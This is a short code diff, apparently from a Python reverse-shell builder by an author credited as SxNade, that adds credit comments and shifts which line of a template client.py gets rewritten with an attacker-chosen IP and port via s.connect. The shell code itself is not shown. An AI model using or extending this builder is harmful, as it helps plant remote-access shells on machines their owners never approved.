@@ -1,3 +1,7 @@
+#By SxNade
+#https://github.com/SxNade
+#CONTRIBUTE
+
 import os
 import sys
 import time
@@ -41,7 +45,7 @@ def aim():
 def fire():
     with open('client.py', 'r') as file:
         data = file.readlines()
-    data[18] = f's.connect(("{reverse_ip}", {reverse_port}))\n'
+    data[22] = f's.connect(("{reverse_ip}", {reverse_port}))\n'
     #editing the source code...for specified reverse_shell IP and PORT
     with open('client.py', 'w') as file:
         file.writelines( data )
